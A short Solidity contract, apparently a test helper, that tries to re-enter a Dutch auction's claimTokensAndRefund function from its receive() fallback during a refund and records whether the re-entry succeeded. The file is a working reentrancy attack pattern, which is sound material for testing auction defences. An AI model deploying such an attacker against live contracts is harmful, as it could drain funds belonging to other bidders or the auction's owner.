// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IDutchAuction {
    function bid() external payable;
    function claimTokensAndRefund() external;
}

contract ReentrancyAttacker {
    IDutchAuction public immutable auction;
    uint256 public attackCount;
    bool public reentrancySucceeded;

    constructor(address _auction) {
        auction = IDutchAuction(_auction);
    }

    function placeMaliciousBid() external payable {
        auction.bid{value: msg.value}();
    }

    function executeAttack() external {
        attackCount = 0;
        auction.claimTokensAndRefund();
    }

    receive() external payable {
        attackCount++;
        if (attackCount < 2) {
            try auction.claimTokensAndRefund() {
                reentrancySucceeded = true;
            } catch {
                reentrancySucceeded = false;
            }
        }
    }
}